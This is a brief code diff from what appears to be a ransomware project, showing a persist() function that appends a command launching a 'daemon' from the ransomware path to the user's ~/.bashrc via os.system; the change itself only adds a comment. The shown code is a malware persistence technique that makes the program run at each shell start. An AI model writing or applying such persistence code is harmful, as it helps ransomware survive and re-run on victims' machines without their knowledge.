@@ -173,7 +173,7 @@ def menu():
 
 def persist():
     # cp = 'cp ' + ransomware_path + 'daemon ~/.bashrc'
-
+    # check if daemon not in bashrc
     nano = 'echo ".' + ransomware_path + '/daemon" >> ~/.bashrc '
     os.system(nano)
 
